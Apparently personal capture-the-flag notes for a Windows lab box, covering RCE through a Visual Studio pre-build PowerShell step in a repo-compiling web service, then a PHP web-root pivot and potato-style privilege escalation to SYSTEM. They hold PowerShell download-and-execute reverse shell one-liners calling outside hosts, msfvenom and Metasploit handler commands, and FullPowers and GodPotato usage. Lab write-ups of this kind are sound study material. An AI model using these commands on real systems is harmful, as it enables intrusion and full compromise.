Port 80 is a website talking about converting github links into executables or DLLs. "Simply provide us with your Git Repo link, and we'll handle the rest. Our cutting-edge technology compiles your projects and sends back the executable or DLL files you need, effortlessly and efficiently."

The windows web server is an apache 2.4.56 with PHP running

Invoke-WebRequest -Uri http://10.10.14.166:4444/?p=Test -Method GET

After sending a json request we get an error that shows the directory the website is stored: C:\xampp\htdocs\submit.php

Special characters are not allowed in the URL, even "http://IP/" isnt allowed

The website is a bit strange since sending public githubs that contain sln files tends to result in the Error "The repository doesn't contain a .sln file or the URL submitted is invalid."

**UPDATE**
curl https://github.com/EndermanSUPREME/csharp_powershell.git/info/refs?service=git-upload-pack --> downloads a data file called refs

Unsure on why when visual.htb can indeed access this file why it seems to have a hard time doing other things.

https://theartofmachinery.com/2016/07/02/git_over_http.html --> helps with dealing with this issue, after doing everything the python web server gets hit with what appears to be a git clone

After the site does its thing, i got hit with a build failed and they gave me a dump of info concerning why it failed, ill need to scan through it to find any useful information

1.) Make repo on github.com & add the vs project files in the repo (.sln and etc)
2.) git clone --mirror https://github.com/EndermanSUPREME/csharp_powershell.git
3.) run as sudo the other commands to set up the http server hosting the repo to then send at visual.htb

I need to keep an eye out for Visual Studio Compile RCE exploits

By going into the project settings in visual studio, we can set the project that before building it executes powershell code.

Windows Reverse Shell Crafting:
https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3 --> has a nice one liner ps1

powershell -c "echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.166:8000/shell.ps1') | powershell -noprofile"

Using msfconsole, after we gain a session from our listener, we need to run
sessions -i [int] to gain access to the session and interact with our shell.
----------------------------------------------------

curl http://10.10.15.68:80/winpeas.ps1 -O winpeas.ps1
.\winpeas.ps1 > enoxEnum.txt ==> didnt output anything helpful

As enox we can access the websites root dir C:\xampp\htdocs and write our own php files to horizontally pivot to a new user `nt authority\local service`

powershell+-c+"echo+IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.68:8000/shell3.ps1')+|+powershell+-noprofile"

As local service we can try performing a priv esc to regain privilages that can potientially allow us to become an administrator and root the box (FullPower Priv Esc)

curl http://10.10.15.68:8000/FullPower.zip -UseBasicParsing -O FullPower.zip

Expand-Archive C:\Users\Public\Documents\FullPower.zip -DestinationPath C:\Users\Public\Documents

msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=INT --format=exe > shell.exe

[4445, 9001, 9002] --> ports we've been shelling to

msfconsole {
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost
	set lport
	run
}

Using .\FullPowers.exe -c "" --> Exec a command with full local privs

Expand-Archive C:\Users\Public\Documents\juiccypotato.zip -DestinationPath C:\Users\Public\Documents

Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplication" | Select-Object Description, AppName, AppID, CommandLine > coms.txt

.\JuicyPotatoNG.exe -t * -p C:\Users\Public\Documents\mal.bat -c "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}" -l 9999 ==> JuicyPotato isnt going to work

Move-Item C:\Users\Public\Documents\coms.txt C:\xampp\htdocs\coms.txt

.\godpotato.exe -cmd "cmd /c .\shell.exe" ==> execs as local system!

As local system we can access Administrator and get root.txt
